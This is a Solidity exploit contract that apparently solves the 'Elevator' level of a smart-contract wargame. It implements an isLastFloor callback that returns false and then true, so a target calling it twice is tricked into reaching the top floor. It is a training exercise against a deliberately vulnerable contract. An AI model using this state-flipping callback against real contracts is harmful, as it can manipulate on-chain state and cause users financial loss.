// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IElevator { // 1) change interface name

    function top() external view returns(bool);
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack { // 2) change nameattck

    bool private flag = false;
    
    function attack(address _target) external {

        IElevator target = IElevator(_target);

        target.goTo(12);
    }

    function isLastFloor(uint256) external returns (bool) {
        
        if (!flag) {
            flag = true;
            return false;
        }
        else
            return true;
    }

}